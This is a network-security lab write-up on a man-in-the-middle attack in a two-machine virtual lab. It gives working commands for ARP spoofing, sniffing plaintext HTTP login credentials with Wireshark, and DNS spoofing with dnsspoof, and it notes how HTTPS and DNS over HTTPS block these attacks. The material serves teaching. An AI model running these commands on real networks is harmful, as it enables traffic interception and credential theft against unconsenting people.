# 🧪 Practical 1: MITM Attack using ARP Spoofing, Traffic Sniffing & DNS Spoofing

## Objective
To perform a complete **Man-in-the-Middle (MITM)** attack by:
- Making Kali Linux act as a router
- Intercepting victim traffic
- Capturing HTTP credentials
- Performing DNS spoofing
- Understanding why modern defenses (HTTPS, DoH) stop attacks

---

## Lab Architecture

Internet
↓
Kali Linux (Attacker + Router)
↓
Ubuntu (Victim)

---

## Machines Used
- **Kali Linux** – Attacker, router, sniffer
- **Ubuntu Linux** – Victim machine

---

## Network Configuration

### Kali Linux
- Adapter 1: **NAT** (Internet access)
- Adapter 2: **Host-Only** (Victim network)

### Ubuntu
- Adapter 1: **Host-Only only**

---

## Step 1: Verify Network Interfaces

### Kali

ip a
Expected:

eth0 → NAT IP (e.g. 10.0.2.15)

eth1 → Host-Only IP (e.g. 192.168.56.101)

ip a

Expected:

IP like 192.168.56.106
Step 2: Enable Packet Forwarding (Router Mode)
Kali
sudo sysctl -w net.ipv4.ip_forward=1

Verify:
cat /proc/sys/net/ipv4/ip_forward
Expected output:

1
Purpose: Allows Kali to forward packets like a router.

Step 3: Enable NAT on Kali (Internet Sharing)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE


Purpose: Allows Ubuntu to access the internet via Kali.

Step 4: Set Ubuntu Default Gateway to Kali
Ubuntu
sudo ip route replace default via 192.168.56.101


Check:

ip route


Expected:

default via 192.168.56.101

Step 5: Connectivity Test
Ubuntu
ping 8.8.8.8
ping google.com


If successful, routing is correct.

Step 6: Verify MITM Position
Kali
sudo tcpdump -i eth1


Ping from Ubuntu.

Seeing packets confirms traffic passes through Kali.

Step 7: ARP Spoofing (Active MITM)
Kali
sudo arpspoof -i eth1 -t 192.168.56.106 192.168.56.101


Effect:
Victim believes Kali is the gateway.

Step 8: Traffic Sniffing with Wireshark
Kali
sudo wireshark


Capture on eth1

Filter:

http

Step 9: Capture HTTP Credentials
Wireshark Filter
http.request.method == "POST"

Ubuntu

Visit:

http://testphp.vulnweb.com/login.php


Submit test credentials.

Wireshark

Expand:

Hypertext Transfer Protocol
  → HTML Form URL Encoded


Result:
Username and password visible in plain text.

Step 10: DNS Spoofing
Create DNS Rule (Kali)
nano dns.txt


Add:

testphp.vulnweb.com 192.168.56.101

Start DNS Spoof
sudo dnsspoof -i eth1 -f dns.txt

Step 11: Observe DNS Traffic
Wireshark Filter
dns


DNS queries and responses are visible.

Step 12: DNS Spoof Failure (Defense Observed)

Observed queries:

HTTPS testphp.vulnweb.com


Reason:
Ubuntu uses DNS over HTTPS (DoH), which encrypts DNS traffic and prevents spoofing.

Step 13: Disable DoH (Lab Purpose Only)
Ubuntu
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved


Edit DNS:

sudo nano /etc/resolv.conf


Set:

nameserver 8.8.8.8


(Optional lock)

sudo chattr +i /etc/resolv.conf

Step 14: Retest DNS Spoofing

Restart dnsspoof

Revisit the site

Observe spoofed DNS replies from Kali

Key Learnings

MITM requires correct routing and ARP spoofing

HTTP exposes credentials in clear text

DNS spoofing breaks domain identity

HTTPS protects application data

DNS over HTTPS (DoH) protects DNS resolution

Modern defenses block classic attacks

Practical Summary
Attack	Result
ARP Spoofing	✅ Success
Traffic Sniffing	✅ Success
HTTP Credential Capture	✅ Success
DNS Spoofing	✅ After disabling DoH
HTTPS Protection	❌ Blocks attack


